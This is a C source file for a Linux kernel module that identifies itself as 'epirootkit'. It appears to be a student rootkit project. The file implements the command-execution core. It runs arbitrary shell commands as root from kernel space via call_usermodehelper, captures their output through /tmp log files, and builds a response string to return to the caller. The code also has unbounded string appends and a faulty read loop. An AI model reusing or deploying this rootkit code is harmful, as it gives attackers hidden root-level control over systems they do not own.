#include <linux/module.h>
#include <linux/kmod.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kthread.h>

#include "commands.h"

static char *data = NULL;

int run_command(void *v)
{
   static char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
   struct subprocess_info *sub_info = NULL;

   char **argv = kzalloc(4 * sizeof(char *), GFP_KERNEL);
   for (int i = 0; i < 4; i++)
   {
       argv[i] = kzalloc(ALLOC_SIZE * sizeof(char), GFP_KERNEL);
   }
   char *cmd = v;
   char *tmp1 = strstr(cmd, " > ");
   char *tmp2 = strstr(cmd, " >> ");
   if (tmp1 || tmp2)
   {
       cmd = strcat(cmd, " 2> /tmp/stderr.log");
   }
   else
   {
       // We need to construct the string command with the correct redirections
       cmd = strcat(cmd, " 1> /tmp/stdout.log 2> /tmp/stderr.log");
   }

   argv[0] = strcpy(argv[0], "/bin/sh");
   argv[1] = strcpy(argv[1], "-c");
   argv[2] = strcpy(argv[2], cmd);
   argv[3] = NULL;

   int status = 0;

   pr_info("[epirootkit]: running %s\n", cmd);
   sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
   if (sub_info == NULL)
   {
     pr_err("[epirootkit]: failed to setup usermodehelper\n");
     return 1;
   }
   status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
   pr_info("[epirootkit]: finished with exit status: %d\n", status);

   if (status != 0)
   {
     pr_err("[epirootkit]: error during command execution: %d\n", status);
     data = build_response(status, STDERR);
   }
   else
   {
     pr_info("[epirootkit]: successful execution");
     data = build_response(status, STDOUT);
   }
   for (int i = 0; i < 4; i++)
   {
       kfree(argv[i]);
   }
   kfree(argv);
   return status;
}

char* exec_command(char *cmd)
{
  int ret = run_command(cmd);
  if (data)
  {
     pr_info("[epirootkit]: successful execution\n");
  }
  else
  {
     pr_err("[epirootkit]: error in main thread:%d\n", ret);
  }
  return data;
}

char *build_response(int return_code, int stream)
{
  struct file *file;
  ssize_t file_sz = 0;
  ssize_t bread = 0;
  loff_t offset = 0;

  if (stream == STDOUT)
  {
     pr_info("[epirootkit]: stdout\n");
     file = filp_open(STDOUT_FILE, O_RDONLY, 0);
  }
  else if (stream == STDERR)
  {
     pr_info("[epirootkit]: stderr\n");
     file = filp_open(STDERR_FILE, O_RDONLY, 0);
  }
  else
  {
     pr_info("[epirootkit]: exit code\n");
     file = NULL;
  }
  if (IS_ERR(file) || file == NULL)
  {
     if (return_code >= 0)
     {
       char *buf = kzalloc(50 * sizeof(char), GFP_KERNEL);
       snprintf(buf, 50, "Exit code : %d\n", return_code >> 8);
       return buf;
     }
     pr_err("[epirootkit]: file error.");
     return NULL;
  }
  file_sz = i_size_read(file_inode(file));

  if (file_sz < 0)
  {
     pr_err("[epirootkit]: error in file size.");
     filp_close(file, NULL);
     return NULL;
  }
  else if (file_sz == 0)
  {
     filp_close(file, NULL);
     return build_response(return_code, EXCODE);
  }
  else
  {
     char *buffer = kzalloc((file_sz + 51) * sizeof(char), GFP_KERNEL);
     bread = kernel_read(file, buffer, file_sz, &offset);
     // We want to make sure we read the whole file
     while (bread < file_sz && bread > 0)
     {
         bread = kernel_read(file, buffer + bread, file_sz, &offset);
     }
     // Exit code part

     char *exit = build_response(return_code, EXCODE);
     buffer[file_sz] = '\n';
     buffer = strncat(buffer, exit, 15);

     filp_close(file, NULL);

     kfree(exit);
     return buffer;
  }
}
